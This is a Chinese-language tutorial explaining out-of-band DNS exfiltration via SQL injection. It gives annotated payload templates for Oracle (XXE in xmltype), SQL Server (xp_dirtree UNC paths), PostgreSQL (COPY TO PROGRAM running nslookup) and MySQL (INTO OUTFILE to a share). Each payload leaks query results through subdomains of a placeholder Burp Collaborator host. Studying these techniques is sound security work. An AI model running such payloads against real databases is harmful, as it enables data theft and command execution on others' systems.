# SQL DNS查询

## 一、整体思路（先理解这一点非常关键）

你看到的这一整段，本质上描述的是一种 **“基于 DNS 的带外数据回传（OOB, Out-of-Band）” 技术**，常见于：

- SQL 注入无法直接回显结果
- 但数据库服务器 **可以主动访问外部网络**

### 核心逻辑只有三步

1. **把查询结果变成一个字符串**
   - 比如数据库名、用户名、版本号等
2. **让数据库服务器访问一个你控制的域名**
   - 访问方式可以是 HTTP、UNC 路径、nslookup 等
3. **把“查询结果”拼进域名中**
   - 这样在 DNS 日志里就能看到被“泄露”的数据

Burp Collaborator 的作用是：

- 提供一个你唯一拥有的域名
- 记录所有 DNS / HTTP / SMB 请求
- 让你看到数据库服务器“主动发出来的请求”

------

## 二、Oracle（甲骨文）语句在做什么

```
SELECT EXTRACTVALUE(
  xmltype(
    '<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [
       <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/">
       %remote;
     ]>'
  ),
'/l') 
FROM dual
```

### 关键点拆解

#### 1. `xmltype(...)`

- Oracle 可以解析 XML 文档
- 这里构造了**一段“恶意 XML”**

#### 2. `<!ENTITY % remote SYSTEM "http://...">`

- 这是 **XML 外部实体（XXE）**
- `SYSTEM "http://..."` 表示：
  - 解析 XML 时，要去访问这个 URL

#### 3. `(SELECT YOUR-QUERY-HERE)`

- 查询结果被拼进 URL 的**子域名**

- 例如：

  ```
  http://ORCLDB.BURP-COLLABORATOR-SUBDOMAIN/
  ```

#### 4. 为什么会有 DNS 请求？

- Oracle 在访问 `http://xxx` 前
- 必须先 **解析域名**
- DNS 请求 → 被 Collaborator 记录

📌 **重点**：
 Oracle 并不是“主动发 DNS”，而是因为 **XML 解析触发了网络访问**

------

## 三、Microsoft SQL Server（微软）语句在做什么

```
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

### 关键点拆解

#### 1. `xp_dirtree`

- SQL Server 的**扩展存储过程**
- 用来列出目录内容

#### 2. `\\server\share`（UNC 路径）

- Windows 访问网络共享的标准方式
- 访问时会：
  1. 解析主机名（DNS）
  2. 再尝试 SMB 连接

#### 3. 拼接的路径

```
\\<查询结果>.BURP-COLLABORATOR-SUBDOMAIN\a
```

#### 4. 为什么能泄露数据？

- 查询结果 → 作为“服务器名”
- Windows 必须先做 DNS 查询
- Collaborator 收到 DNS / SMB 请求

📌 **前提条件**：

- 数据库运行在 Windows
- 账户有执行 `xp_dirtree` 的权限

------

## 四、PostgreSQL 语句在做什么

```
create or replace function f() returns void as $$
declare c text;
declare p text;
begin
  SELECT into p (SELECT YOUR-QUERY-HERE);
  c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
  execute c;
end;
$$ language plpgsql security definer;

SELECT f();
```

### 关键点拆解

#### 1. `COPY ... TO PROGRAM`

- PostgreSQL 的一个高级特性
- 允许数据库 **调用操作系统命令**

#### 2. `nslookup`

- 一个标准 DNS 查询工具

- 明确告诉系统：

  > 去查询这个域名

#### 3. 查询结果的位置

```
nslookup <查询结果>.BURP-COLLABORATOR-SUBDOMAIN
```

#### 4. `security definer`

- 函数以 **创建者权限**执行
- 这是能否成功的关键

📌 **这是最“直接”的 DNS 外泄方式**
 因为它不是“顺带触发”，而是**明确执行 DNS 查询**

------

## 五、MySQL（Windows）语句在做什么

```
SELECT YOUR-QUERY-HERE
INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### 关键点拆解

#### 1. `INTO OUTFILE`

- 把查询结果写入文件

#### 2. Windows UNC 路径

```
\\BURP-COLLABORATOR-SUBDOMAIN\a
```

- MySQL 尝试写文件到“网络共享”
- Windows 先进行 DNS 解析

#### 3. 为什么只适用于 Windows？

- Linux 不使用 UNC 路径
- 不会自动触发 SMB / DNS 行为

📌 **成功依赖条件非常多**：

- MySQL 有文件写权限
- 运行在 Windows
- 没有被 `secure_file_priv` 限制

------

## 六、这些语句的共同点（总结）

| 维度         | 共性       |
| ------------ | ---------- |
| 数据载体     | 查询结果   |
| 外泄通道     | DNS        |
| 回传方式     | 子域名     |
| 是否需要回显 | 不需要     |
| 是否依赖网络 | 必须能出网 |

一句话总结：

> **不是数据库“支持 DNS 外泄”，而是数据库的某些功能会“被迫访问外部资源”，从而暴露 DNS 查询。**